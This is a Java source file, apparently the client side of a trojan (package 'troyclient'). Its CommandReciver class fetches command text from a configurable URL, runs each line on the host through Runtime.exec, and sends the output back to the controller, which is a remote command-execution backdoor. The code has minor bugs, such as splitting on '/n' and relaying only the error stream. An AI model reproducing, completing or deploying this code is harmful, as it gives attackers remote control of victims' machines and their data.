package ch.lebois.troyclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class CommandReciver {


    private String url = "http://localhost:8080/command";
    private WebHandler webHandler;
    private Sender sender;

    CommandReciver(){
        setUrl(url);
    }

    CommandReciver(String url){
        setUrl(url);
    }


    public void setUrl(String url) {
        this.url = url;
        webHandler =  new WebHandler(url);
        sender = new Sender();
    }

    public void readCommands(){
        String[] commands = webHandler.getContent().split("/n");
        for (String command : commands) {
            excecute(command);
        }
    }


    public void excecute(String command) {
        Process pr = null;
        try {
            pr = Runtime.getRuntime().exec(command);

            BufferedReader err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
            String line;
            while ((line = err.readLine()) != null) {
                System.out.println("command" + line);
                sender.send("result", line);
            }
        } catch (IOException e) {
            sender.send("error", "void");
        }

    }

}
